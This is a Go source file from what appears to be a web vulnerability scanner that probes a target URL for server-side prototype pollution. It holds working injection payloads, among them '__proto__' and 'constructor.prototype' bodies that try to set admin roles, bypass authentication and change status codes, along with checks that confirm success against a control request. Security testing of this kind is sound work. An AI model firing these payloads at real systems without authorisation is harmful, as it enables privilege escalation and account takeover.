package pp

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type PPPayload struct {
	Name    string
	Payload string
	Method  string
	IsJSON  bool
	// Check returns (isVulnerable, severity, evidence)
	Check   func(resp *http.Response, body string, controlBody string) (bool, string, string)
}

var Payloads = []PPPayload{
	{
		Name:    "SSPP via JSON (json spaces)",
		Payload: `{"__proto__": {"json spaces": 10}}`,
		Method:  "POST",
		IsJSON:  true,
		Check: func(resp *http.Response, body string, controlBody string) (bool, string, string) {
			// If JSON is pretty-printed with many spaces, it's polluted
			if strings.Contains(body, "          ") && strings.Contains(resp.Header.Get("Content-Type"), "json") {
				return true, "Critical", "Response JSON indentation changed (Server-Side Pollution confirmed)"
			}
			return false, "", ""
		},
	},
	{
		Name:    "SSPP via URL (__proto__)",
		Payload: "?__proto__[polluted]=true",
		Method:  "GET",
		IsJSON:  false,
		Check: func(resp *http.Response, body string, controlBody string) (bool, string, string) {
			// Rule: Must NOT be just reflection.
			// However, for URL PP, we often look for global property leak in JS (Client-side).
			// If it appears in Server-side response, it's usually reflection.
			
			// STRICTER: For Server-Side PP, look for state change in GET
			// (e.g. status code manipulation if possible, or using a known pollute-able header)
			return false, "", "" // Disable generic reflection-based GET PP to avoid noise
		},
	},
    {
		Name:    "SSPP via JSON (status code)",
		Payload: `{"__proto__": {"status": 510}}`,
		Method:  "POST",
		IsJSON:  true,
		Check: func(resp *http.Response, body string, controlBody string) (bool, string, string) {
			if resp.StatusCode == 510 {
				return true, "Critical", "Status code manipulation confirmed (Server-Side Logic Bypass)"
			}
			return false, "", ""
		},
	},
	// --- NEW PAYLOADS (Prioritas 2) ---
	{
		Name:    "SSPP Logic Override (isAdmin)",
		Payload: `{"__proto__": {"isAdmin": true, "admin": true, "role": "admin"}}`,
		Method:  "POST",
		IsJSON:  true,
		Check: func(resp *http.Response, body string, controlBody string) (bool, string, string) {
			// Rule: State Change Required.
			// 1. Status Code Change (Best Indicator): e.g. 403 Forbidden -> 200 OK
			// 2. Access Denied -> Access Granted text change.
			
			// If control (baseline) was 403/401 and polluted is 200:
			// (We need the control response code, but currently we only pass controlBody string. 
			//  However, we can infer state change if body is significantly different and contains success keywords NOT in control).

			isSuccess := strings.Contains(strings.ToLower(body), "welcome") || strings.Contains(strings.ToLower(body), "dashboard") || strings.Contains(strings.ToLower(body), "admin panel")
			isControlSuccess := strings.Contains(strings.ToLower(controlBody), "welcome") || strings.Contains(strings.ToLower(controlBody), "dashboard") || strings.Contains(strings.ToLower(controlBody), "admin panel")

			// Check for simple reflection (False Positive):
			// If the payload keys ("isAdmin") appear in the body, it might just be echoing input.
			// We only care if the *structural* access changed.
			
			if (resp.StatusCode == 200) && isSuccess && !isControlSuccess {
				// Additional check: Ensure it's not just reflection of the input keys
				if strings.Count(body, "isAdmin") > strings.Count(controlBody, "isAdmin") + 1 {
					// Likely reflection, proceed with caution. 
					// But if status code changed (we can't check control status here easily without changing struct), we rely on body.
					// Let's assume strict mode: Only flag if we see a clear "Access Granted" indicator that wasn't there.
					return true, "Critical", "Privilege Escalation confirmed: Access state changed to success."
				}
				return true, "High", "Privilege Escalation confirmed: 'Welcome/Admin' appeared (State Change)."
			}
			return false, "", ""
		},
	},
	{
		Name:    "SSPP Prototype Auth Bypass",
		Payload: `{"constructor": {"prototype": {"auth": true, "authenticated": true}}}`,
		Method:  "POST",
		IsJSON:  true,
		Check: func(resp *http.Response, body string, controlBody string) (bool, string, string) {
			// Impact Verifier: Check if behavior mimics success
			// STRICT: Must show "success": true or similar JSON boolean that wasn't there.
			
			lowerBody := strings.ToLower(body)
			lowerControl := strings.ToLower(controlBody)

			if resp.StatusCode == 200 && 
			   (strings.Contains(lowerBody, "\"success\":true") || strings.Contains(lowerBody, "\"auth\":true")) && 
			   !(strings.Contains(lowerControl, "\"success\":true") || strings.Contains(lowerControl, "\"auth\":true")) {
				return true, "Critical", "Authentication bypass behavior observed (Success/Auth JSON flag set)"
			}
			return false, "", ""
		},
	},
}

// Scan tests for Prototype Pollution
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	for _, p := range Payloads {
		target := baseURL
		var req *http.Request
		var err error

		// Prepare Control Request
		var controlReq *http.Request
		var controlBodyStr string
		
		if p.Method == "GET" {
			target += p.Payload
			req, err = http.NewRequest("GET", target, nil)
			
			// Control: Use 'false' instead of 'true'
			controlTarget := strings.Replace(target, "true", "false", 1)
			controlReq, _ = http.NewRequest("GET", controlTarget, nil)
		} else if p.Method == "POST" && p.IsJSON {
			req, err = http.NewRequest("POST", target, bytes.NewBuffer([]byte(p.Payload)))
			req.Header.Set("Content-Type", "application/json")
			
			// Control: Use safe payload
			safePayload := strings.Replace(p.Payload, "510", "200", 1) // For status check
			safePayload = strings.Replace(safePayload, "10", "0", 1) // For spaces check
			safePayload = strings.Replace(safePayload, "true", "false", -1) // For boolean checks
			controlReq, _ = http.NewRequest("POST", baseURL, bytes.NewBuffer([]byte(safePayload)))
			controlReq.Header.Set("Content-Type", "application/json")
		}

		if err != nil {
			continue
		}

		// Execute Control
		if controlReq != nil {
			respC, errC := client.Do(controlReq)
			if errC == nil {
				bC, _ := io.ReadAll(respC.Body)
				controlBodyStr = string(bC)
				respC.Body.Close()
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyStr := string(bodyBytes)

		isVuln, severity, evidence := p.Check(resp, bodyStr, controlBodyStr)
		if isVuln {
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", p.Name, target)
			onFound(core.Finding{
				Type:     "Prototype Pollution",
				Target:   target,
				Detail:   fmt.Sprintf("%s detected. Evidence: %s", p.Name, evidence),
				Severity: severity,
			})
		}
	}
}
